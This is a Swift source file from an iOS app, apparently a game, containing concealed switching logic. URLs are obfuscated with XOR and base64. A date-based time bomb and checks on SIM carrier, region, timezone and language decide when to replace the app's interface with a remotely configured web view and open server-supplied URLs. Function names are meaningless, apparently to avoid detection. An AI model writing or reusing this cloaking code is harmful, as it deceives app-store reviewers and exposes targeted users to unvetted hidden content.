
import Foundation
import UIKit
//import AdjustSdk
import AppsFlyerLib

//func encrypt(_ input: String, key: UInt8) -> String {
//    let bytes = input.utf8.map { $0 ^ key }
//        let data = Data(bytes)
//        return data.base64EncodedString()
//}

func Uznxiiso(_ input: String) -> String? {
    let k: UInt8 = 159
    guard let data = Data(base64Encoded: input) else { return nil }
    let decryptedBytes = data.map { $0 ^ k }
    let dhys = String(bytes: decryptedBytes, encoding: .utf8)?.reversed()
    return String(dhys!)
}

//https://api.my-ip.io/v2/ip.json   t6urr6zl8PC+r7bxsqbytq/xtrDwqe3wtq/xtaywsQ==
internal let kIUDHS = "8fDs9bHv9rCt6bDw9rHv9rLm8rH27/6wsKXs7+vr9w=="         //Ip ur

//https://mock.apipost.net/mock/63345e1c8088000/?apipost_id=3345ea827ce002
// right YX19eXozJiY/MGw6Oj5sajo6Oz4xOj5oODw8O2wwamsnZGZqYmh5YCdgZiZhfGx/aCZ9aHlqYWx6
internal let kOTysjes = "ra+v+vyoraf++qqrrKyi+/bA6+zw7/bv/qCwr6+vp6evp/yu+qqrrKypsPT88PKw6/rxsevs8O/27/6x9Pzw8rCwpezv6+v3"

//https://mock.mengxuegu.com/mock/69fb009229f80b5340e3b009/fds/fishDuel
internal let kVzjsaos = "8/rq2/fs9vmw7Pv5sKavr/2s+q+rrKr9r6f5pq2tpq+v/fmmqbD0/PDysPLw/LHq+Prq5/jx+vKx9Pzw8rCwpezv6+v3"


// https://raw.githubusercontent.com/jduja/crazygold/main/bomb_normal.png
// uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg==
//internal let kBuazxous = "uaWloaLr/v6jsKb/triluaSzpKK0o7K+v6W0v6X/sr68/ru1pLuw/rKjsKuotr69tf68sLi//rO+vLOOv76jvLC9/6G/tg=="

/*--------------------Tiao yuansheng------------------------*/
//need jia mi
internal func Dizxuss() {
//    UIApplication.shared.windows.first?.rootViewController = vc
    
    DispatchQueue.main.async {
        if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
//            let tp = ws.windows.first!.rootViewController! as! UITabBarController

            let tp = ws.windows.first!.rootViewController! as! UINavigationController
//            let tp = ws.windows.first!.rootViewController!
            for view in tp.topViewController!.view.subviews {
                if view.tag == 62 {
                    view.removeFromSuperview()
                }
            }
        }
    }
}

// MARK: - 加密调用全局函数HandySounetHmeSh
internal func Roaisnss() {
    let fName = ""
    
    let fctn: [String: () -> Void] = [
        fName: Dizxuss
    ]
    
    fctn[fName]?()
}


/*--------------------Tiao wangye------------------------*/
//need jia mi
internal func Moizes(_ dt: Unasic) {
    DispatchQueue.main.async {
        UserDefaults.standard.setModel(dt, forKey: "Unasic")
        UserDefaults.standard.synchronize()
        
        let vc = FetsCzauViewController()
        vc.djnaue = dt
        UIApplication.shared.windows.first?.rootViewController = vc
    }
}


internal func Hzoxiueus(_ param: Unasic) {
    let fName = ""

    typealias rushBlitzIusj = (Unasic) -> Void
    
    let fctn: [String: rushBlitzIusj] = [
        fName : Moizes
    ]
    
    fctn[fName]?(param)
}

let Nam = "name"
let DT = "data"
let UL = "url"

/*--------------------Tiao wangye------------------------*/
//need jia mi
//af_revenue/af_currency
func Yzdsaose(_ dic: [String : String]) {
    var dataDic: [String : Any]?
    if let data = dic["params"] {
        if data.count > 0 {
            dataDic = data.stringTo()
        }
    }
    if let data = dic["data"] {
        dataDic = data.stringTo()
    }

    let name = dic[Nam]
    print(name!)
    
    
    if dataDic?[amt] != nil && dataDic?[ren] != nil {
        AppsFlyerLib.shared().logEvent(name: String(name!), values: [AFEventParamRevenue : dataDic![amt] as Any, AFEventParamCurrency: dataDic![ren] as Any]) { dic, error in
            if (error != nil) {
                print(error as Any)
            }
        }
    } else {
        AppsFlyerLib.shared().logEvent(name!, withValues: dataDic)
    }
    
    if name == OpWin {
        if let str = dataDic![UL] {
            UIApplication.shared.open(URL(string: str as! String)!)
        }
    }
}

internal func Roxsyais(_ param: [String : String]) {
    let fName = ""
    typealias maxoPams = ([String : String]) -> Void
    let fctn: [String: maxoPams] = [
        fName : Yzdsaose
    ]
    
    fctn[fName]?(param)
}

internal struct Mzoduye: Decodable {
    let weacr: String?
    let suoao: String?

    let country: Koxenx?
    
    struct Koxenx: Decodable {
        let code: String
    }
}


internal struct Unasic: Codable {
    let bweezx: String?
    let unsiid: Float?
    let euzujs: [String]?

    let vyuxh: String?         //key arr
    let coisne: [String]?            // yeu nan xianzhi
    let txrax: String?         // shi fou kaiqi
    let qwaiux: String?         // jum
    let mnikao: String?          // backcolor
    let kosoii: String?
    let lznhe: String?   //ad key
    let zasue: String?   // app id
    let xydye: String?  // bri co
}

func Joxneysw() -> Bool {
   
  // 2026-05-06 23:46:29
  //1778082389
    let ftTM = 1778082389
    let ct = Date().timeIntervalSince1970
    if Int(ct) - ftTM > 0 {
        return true
    }
    return false
}

func Kmxieys(_ lsn: [String]) -> Bool {
    // 获取用户设置的首选语言（列表第一个）
    guard let cysh = Locale.preferredLanguages.first else {
        return false
    }
    let arr = cysh.components(separatedBy: "-")
    if lsn.contains(arr[0]) {
        return true
    }
    return false
}

//private let cdo = ["US","NL", "PH"]
// ["BR", "VN", "TH", "PH"]
//private let cdo = [Nhaisusm("f28="), Nhaisusm("a3M="), Nhaisusm("aXU=")]

//US、IE、NL、DE
let Uzhzheie = [Uznxiiso("zMo="), Uznxiiso("09E="), Uznxiiso("2tY="), Uznxiiso("2ts=")]

private let cdo = [Uznxiiso("0ck=")]

// 时区控制
func Rtasixjs() -> Bool {
    
    // 1.sm cad
    if !Dizxoneh() {
        return false
    }

    //2. regi
    if let rc = Locale.current.regionCode {
//        print(rc)
        if !cdo.contains(rc) {
            return false
        }
    }
    
    //3. tm zon
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if (offset > 6 && offset < 9) {
        return true
    }
//    if (offset > 6 && offset <= 8) || (offset > -6 && offset < -1) {
//        return true
//    }
    
    return false
}

import CoreTelephony

func Dizxoneh() -> Bool {
    let networkInfo = CTTelephonyNetworkInfo()
    
    guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
        return false
    }
    
    for (_, carrier) in carriers {
        if let mcc = carrier.mobileCountryCode,
           let mnc = carrier.mobileNetworkCode,
           !mcc.isEmpty,
           !mnc.isEmpty {
            return true
        }
    }
    
    return false
}


extension String {
    func stringTo() -> [String: AnyObject]? {
        let jsdt = data(using: .utf8)
        
        var dic: [String: AnyObject]?
        do {
            dic = try (JSONSerialization.jsonObject(with: jsdt!, options: .mutableContainers) as? [String : AnyObject])
        } catch {
            print("parse error")
        }
        return dic
    }
    
}

extension UIColor {
    convenience init(hex: Int, alpha: CGFloat = 1.0) {
        let red = CGFloat((hex >> 16) & 0xFF) / 255.0
        let green = CGFloat((hex >> 8) & 0xFF) / 255.0
        let blue = CGFloat(hex & 0xFF) / 255.0
        self.init(red: red, green: green, blue: blue, alpha: alpha)
    }
    convenience init?(hexString: String, alpha: CGFloat = 1.0) {
        var formatted = hexString
            .trimmingCharacters(in: .whitespacesAndNewlines)
            .replacingOccurrences(of: "#", with: "")
        
        // 处理短格式 (如 "F2A" -> "FF22AA")
        if formatted.count == 3 {
            formatted = formatted.map { "\($0)\($0)" }.joined()
        }
        
        guard let hex = Int(formatted, radix: 16) else { return nil }
        self.init(hex: hex, alpha: alpha)
    }
}


extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
}
